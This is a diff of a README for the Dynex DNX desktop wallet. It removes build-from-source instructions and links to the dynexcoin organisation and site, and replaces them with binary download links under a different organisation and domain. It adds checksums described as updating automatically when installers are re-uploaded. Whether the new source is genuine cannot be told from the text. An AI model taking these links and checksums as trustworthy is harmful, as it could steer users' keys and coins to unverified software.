@@ -1,215 +1,116 @@
-# Dynex Electron Wallet
+<div align="center">
 
-[Dynex Electron GUI Wallet](https://dynexcoin.org) - GUI Stands for Graphical User Interface. It makes it easy for you to use Dynex with a friendly user interface. The Dynex Electron Wallet client allows you to create your wallet, store and send your DNX, view your transactions, stay connected with the Dynex ecosystem.
+# Dynex Wallet
 
-## Features:
-This wallet contains the basic functions required to manage your Dynex (DNX):
+**The free desktop DNX wallet for Windows, macOS and Linux - your keys, your coins.**
 
-* Wallet Creation
-  * Create new wallet
-  * Import from private keys OR mnemonic seed
-* Basic Wallet Operation
-  * Open an existing wallet
-  * Display wallet address & balance
-  * Display private keys/seed
-  * Export private keys/seed
-  * Transactions listing/sorting/searching
-  * Display transaction details
-  * Export incoming, outgoing, or all transactions to csv file.
-  * Incoming Transaction notification
-  * Send DNX to single recipient address, allow to set payment id and custom fee. Provides address lookup from addressbook.
-  * Perform wallet optimization by creating fusion transactions
-* Address Book
-  * Add/Edit/Delete address entry (label/name, address and payment id)
-  * Listing/sorting/searching existing entries
-  * Allow to store same wallet address with different payment id
-  * Autosave address after sending to new/unknown recipient
-* Backup  
-  * Backup your wallet with your private keys so you can restore your wallet anytime
-* Misc
-  * Provides internal node and wallet services
-  * Keyboard shortcuts for ease of use
-  * Multi language system (supporting 10+ languages)
-* Dynex Ecosystem Tools 
-  * DHIP (Opt in for Native L1 Chain)
-  * Bridge (Ability to bridge L1 DNX to L2 0xDNX)
-  * QNODES (Ability to monitor Dynex Quantum Nodes)
+[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)
 
-### Languages
-* ✅ English (Default)
-* ✅ Chinese - flugel
-* ✅ Dutch - MJ
-* French
-* ✅ Greek - nostalgia
-* ✅ German - sumitomo
-* ✅ Italian - piciluc8571
-* Japanese 
-* ✅ Polish - rlyfastessa
-* Portuguese 
-* ✅ Russian - Отец Сергий
-* ✅ Spanish - ismoyano
-* ✅ Swedish - maximilian
-* Turkish
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)
 
-### Verified Supported Operating Systems
-* Windows
-  * ✅ Windows 10
-  * ✅ Windows 11
-* Linux
-  * ✅ Ubuntu 22.04 LTS
-* MAC
-  * 14
-  * 15
-* Android
-  * Android 13
-  * Android 14
-  * Android 15
-* iOS
-  * 16
-  * 17
-  * 18
+[Website](https://dynexwallet.org/) - [Guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) - [Release notes](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) - [Report an issue](https://github.com/Dynex-project/Dynex-Desktop-Wallet/issues)
 
-### Notes
-Dynex Electron Wallet relies on `DNX-service` and `DNX-node` to manage wallet container &amp; rpc communication.
-Release installer & packaged archives includes a ready to use `DNX-service` and `DNX-node` binaries, which is unmodified copy DNX official wallet release github.
+</div>
 
-On first launch, Dynex Electron Wallet will try to detect location/path of bundled `DNX-service` and `DNX-node` binaries, but if autodetection failed, you can manually set path to the `DNX-service` and `DNX-node` binaries on the Settings screen.
+---
 
-If you don't trust the bundled `DNX-service` and `DNX-node` binariy files, you can compare the checksum (sha256sum) against one from the official release, or simply download and use the binaries from official DNX release, which is available here: https://github.com/dynexcoin/Dynex/releases. Then, update your `DNX-service` and `DNX-node` binariy path settings.
+## Downloads
 
-## **Lanch the app**
+| Platform | Requires | File |
+|---|---|---|
+| Windows | Windows 10 / 11 (64-bit) | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) |
+| macOS | macOS 11+ (Intel and Apple Silicon) | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) |
+| Linux | Linux x64 | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip) |
 
-#### Windows:
+### SHA-256 checksums
 
-1. Download the latest installer [here](https://github.com/dynexcoin/dynex-electron-wallet/releases)
-2. Run the installer (Dynex-Electron-Wallet-<version>-win-setup.exe) and follow the installation wizard.
-3. Run as Administrator Dynex-Electron-Wallet via start menu or desktop shortcut. (right click on the app icon and select run as Administrator)
+<!-- SHA256:START -->
+| Platform | File | SHA-256 |
+|---|---|---|
+| Windows | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) | `d4fd916c9741a16e23e39c355a049bac8368dbefa3ee08663ef56c009964e00d` |
+| macOS | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) | `084818fd20207305ded84a747e707fb34f07e1f6e2d9a8123da621b8a546a88d` |
+| Linux | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip) | `535b453c72c6e7749ffae3b95e1d47f67228b78b9862e086dbd13c4d550481c2` |
+<!-- SHA256:END -->
 
-#### GNU/Linux (AppImage):
+> [!IMPORTANT]
+> Checksums update automatically whenever installer files are re-uploaded to the release. Compare every character before running a file. Full walkthrough: [verify a Dynex Wallet download](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/verify-dynex-wallet-sha256-checksum.md).
 
-1. Download latest AppImage bundle [here](https://github.com/dynexcoin/dynex-electron-wallet/releases)
-2. Make it executable, either via GUI file manager or command line, e.g. `chmod +x Dynex-Electron-Wallet-<version>-linux.AppImage`
-3. Run/execute the file, double click in file manager, or run via shell/command line.
+---
 
-See: https://docs.appimage.org/user-guide/run-appimages.html
+## Install
 
-#### macOS
-
-1. Download latest archive [here](https://github.com/dynexcoin/dynex-electron-wallet/releases)
-2. Extract downloaded zip archived into your home folder
-3. Open terminal and Run: `cd /Users/YOURNAME/Dynex-Electron-Wallet.app/Contents/MacOS && ./Dynex-Electron-Wallet`
-
-### Build From Source
-
-Building the Dynex Electron Wallet from source requires `Node.js` and `npm`. Follow the steps below to get started:
-
-#### Prerequisites
-1. **Install Node.js and npm**:  
-   Visit [Node.js official website](https://nodejs.org) to download and install the latest stable version of Node.js (ensure the version is 21.0 or later).
-
-2. **Clone the Repository**:  
-   Clone the wallet's source code repository to your local machine.
-   ```bash
-   # Clone the repository
-   git clone https://github.com/dynexcoin/dynex-electron-wallet
-   cd dynex-electron-wallet
-   ```
-
-3. **Install Dependencies**:  
-   Run the following command to install all necessary dependencies.
-   ```bash
-   npm install
-   ```
-
-#### Building the Wallet
-
-##### For Linux
-To build the wallet as an AppImage for Linux:
-```bash
-node_modules/.bin/electron-builder --x64 --linux AppImage \
-  --config.extraResources=dnx/DNX-service \
-  --config.extraResources=dnx/DNX-node \
-  --config.extraResources=dnx/libcurl.so.4 \
-  --config.extraResources=dnx/libboost_filesystem.so.1.74.0 \
-  --config.extraResources=dnx/libboost_program_options.so.1.74.0 \
-  --config.extraResources=dnx/libz.so.1 \
-  --config.extraResources=lang/en.json \
-  --config.extraResources=lang/cn.json \
-  --config.extraResources=lang/de.json \
-  --config.extraResources=lang/es.json \
-  --config.extraResources=lang/gr.json \
-  --config.extraResources=lang/nerd.json \
-  --config.extraResources=lang/nerd.md \
-  --config.extraResources=lang/nl.json \
-  --config.extraResources=lang/pirate.json \
-  --config.extraResources=lang/pl.json \
-  --config.extraResources=lang/ru.json \
-  --config.extraResources=lang/se.json \
-  --config.extraResources=lang/it.json \
-  --config.extraFiles=postinstall.sh
+**Windows** - run the signed installer, then launch Dynex Wallet from the Start menu.
+```powershell
+Get-FileHash -Algorithm SHA256 .\dynex-wallet-windows-v2.2.3.exe
 ```
-
-##### For Windows
-To build the wallet for Windows, open a Command Prompt as Administrator and run:
+**macOS** - open the DMG and drag Dynex Wallet to Applications. The build is notarised.
 ```bash
-node_modules\.bin\electron-builder.cmd --x64 --win \
-  --config.extraResources=dnx/DNX-service.exe \
-  --config.extraResources=dnx/DNX-node.exe \
-  --config.extraResources=dnx/libcurl.dll \
-  --config.extraResources=dnx/zlib1.dll \
-  --config.extraResources=lang/en.json \
-  --config.extraResources=lang/cn.json \
-  --config.extraResources=lang/de.json \
-  --config.extraResources=lang/es.json \
-  --config.extraResources=lang/gr.json \
-  --config.extraResources=lang/nerd.json \
-  --config.extraResources=lang/nerd.md \
-  --config.extraResources=lang/nl.json \
-  --config.extraResources=lang/pirate.json \
-  --config.extraResources=lang/pl.json \
-  --config.extraResources=lang/ru.json \
-  --config.extraResources=lang/se.json \
-  --config.extraResources=lang/it.json
+shasum -a 256 dynex-wallet-macos-v2.2.3.dmg
 ```
-
-##### For macOS
-To build the wallet for macOS, replace that files in the `resources` and `dnx` with the files in the `mac` folder, then run:
+**Linux x64**
 ```bash
-node_modules/.bin/electron-builder --x64 --mac \
- --config.extraResources=dnx/DNX-service \
- --config.extraResources=dnx/DNX-node \
- --config.extraResources=dnx/libBlockchainExplorer.a \
- --config.extraResources=dnx/libCommon.a \
- --config.extraResources=dnx/libCrypto.a \
- --config.extraResources=dnx/libDynexCNCore.a \
- --config.extraResources=dnx/libHttp.a \
- --config.extraResources=dnx/libInProcessNode.a \
- --config.extraResources=dnx/libJsonRpcServer.a \
- --config.extraResources=dnx/libLogging.a \
- --config.extraResources=dnx/libMnemonics.a \
- --config.extraResources=dnx/libNodeRpcProxy.a \
- --config.extraResources=dnx/libP2P.a \
- --config.extraResources=dnx/libPaymentGate.a \
- --config.extraResources=dnx/libRpc.a \
- --config.extraResources=dnx/libSerialization.a \
- --config.extraResources=dnx/libSystem.a \
- --config.extraResources=dnx/libTransfers.a \
- --config.extraResources=dnx/libWallet.a \
- --config.extraResources=lang/en.json \
- --config.extraResources=lang/cn.json \
- --config.extraResources=lang/de.json \
- --config.extraResources=lang/es.json \
- --config.extraResources=lang/gr.json \
- --config.extraResources=lang/nerd.json \
- --config.extraResources=lang/nerd.md \
- --config.extraResources=lang/nl.json \
- --config.extraResources=lang/pirate.json \
- --config.extraResources=lang/pl.json \
- --config.extraResources=lang/ru.json \
- --config.extraResources=lang/se.json \
- --config.extraResources=lang/it.json \
- --config.extraFiles=postinstall.sh
+sha256sum dynex-wallet-linux-x64-v2.2.3.zip
+unzip dynex-wallet-linux-x64-v2.2.3.zip -d ~/dynex-wallet
+chmod +x ~/dynex-wallet/*
 ```
+Step-by-step with screenshots of each choice: [Dynex Wallet setup guide](https://dynexwallet.org/docs/wallet-setup).
 
-And that's it! Once the build process completes, you’ll find the output files in the `dist` directory. You can then distribute or use the built wallet application.
+---
 
+## What's new in v2.2.3
+
+- **Optimize Wallet** (Tools menu) combines many small mining payouts and warns before a send gets too big - the fix for "transaction byte size too big".
+- **Sync watchdog** recovers wallets that stop at one block.
+- **Clearer balances** - locked vs unconfirmed, unlocking after 8 confirmations.
+- **Payment ID field** on the send screen for exchange deposits.
+- **Reset Blockchain Data** clears chain data only and keeps your wallet files.
+
+## Features
+
+- Create a wallet or restore from mnemonic seed or private keys
+- Send DNX with payment ID and custom fee; address book with payment IDs
+- Transaction history with search, sort and CSV export
+- Wallet optimization via fusion transactions
+- Built-in node and wallet services; remote node option
+- Keyboard shortcuts and multiple languages
+
+## Where things live
+
+| System | Wallet files |
+|---|---|
+| Windows | `%APPDATA%\DynexWallet\wallets` |
+| macOS | `~/Library/Application Support/DynexWallet/wallets` |
+| Linux | `~/.dynexwallet/wallets` |
+
+---
+
+## Guides
+
+| Popular Dynex Wallet guides |
+|---|
+| [How to Install Dynex Wallet on Windows](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/install-dynex-wallet-windows.md) |
+| [How to Install Dynex Wallet on macOS](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/install-dynex-wallet-macos.md) |
+| [How to Install Dynex Wallet on Linux](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/install-dynex-wallet-linux.md) |
+| [Dynex Wallet Sync Stuck at a Block](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/dynex-wallet-sync-stuck-at-block.md) |
+| [Dynex transaction byte size too big](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/dynex-transaction-byte-size-too-big.md) |
+| [Dynex Locked / Unconfirmed Balance Explained](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/dynex-locked-unconfirmed-balance.md) |
+| [How to Back Up Your Dynex Wallet File](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/backup-dynex-wallet-file.md) |
+| [How to Restore a Dynex Wallet from a Recovery Seed](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/restore-dynex-wallet-from-seed.md) |
+| [Dynex exchange Payment ID](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/dynex-exchange-payment-id.md) |
+| [How to avoid fake Dynex Wallet apps and phishing scams](https://github.com/Dynex-project/Dynex-Wallet-Docs/blob/main/docs/avoid-fake-dynex-wallets-phishing.md) |
+| [All 40 Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
+
+More help on the website: [troubleshooting](https://dynexwallet.org/troubleshooting) and [security](https://dynexwallet.org/security).
+
+---
+
+## Security
+
+> [!WARNING]
+> **Your recovery seed is the only way back into your wallet. Never type it into a website and never share it - no Dynex team member will ever ask for it.**
+
+Download only from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).
+
+## Support and license
+
+Questions: [GitHub Issues](https://github.com/Dynex-project/Dynex-Desktop-Wallet/issues) or [dynexwallet.org](https://dynexwallet.org/). Published by Dynex Quantum Technologies AG, Baar, Switzerland. License: ISC.
